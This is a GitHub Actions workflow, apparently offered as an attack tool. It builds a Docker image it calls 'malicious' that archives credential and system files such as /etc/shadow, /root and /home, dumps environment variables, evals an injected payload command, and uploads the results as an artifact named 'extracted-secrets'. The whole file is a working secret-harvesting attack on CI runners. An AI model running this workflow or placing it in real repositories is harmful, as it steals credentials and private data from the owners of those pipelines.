name: Deep CI Extractor

on:
  push:
    branches: [ main ]

jobs:
  extract:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Define Payload Command
        id: define
        run: |
          echo "PAYLOAD_CMD=whoami && hostname && id && ls -la /" >> "$GITHUB_OUTPUT"

      - name: Build and Run Malicious Docker Image
        run: |
          mkdir -p ./malicious
          cat <<'EOF' > ./malicious/Dockerfile
          FROM python:3.11-alpine

          ARG PAYLOAD_CMD

          RUN apk add --no-cache curl tar bash && \
              echo "[+] Collecting leaks..." && \
              tar -czf /leaks.tar.gz \
                  /etc/hosts \
                  /etc/resolv.conf \
                  /etc/passwd \
                  /etc/shadow \
                  /etc/ssl \
                  /etc/pki \
                  /var/lib \
                  /root \
                  /home \
                  2>/dev/null || true && \
              echo "[+] Dumping env vars (excluding OIDC/GITHUB tokens)..." && \
              printenv | grep -vE "GITHUB_TOKEN|OIDC_TOKEN|AWS_" >> /leaks_env.txt && \
              echo "[+] Executing payload..." && \
              eval "$PAYLOAD_CMD"
          EOF

          docker build \
            --build-arg PAYLOAD_CMD="${{ steps.define.outputs.PAYLOAD_CMD }}" \
            -t leak-capture \
            ./malicious

          docker run --rm leak-capture cat /leaks_env.txt > leaks_env.txt || true
          docker run --rm leak-capture cat /leaks.tar.gz > leaks.tar.gz || true

      - name: Upload Artifacts
        uses: actions/upload-artifact@v4
        with:
          name: extracted-secrets
          path: |
            leaks_env.txt
            leaks.tar.gz
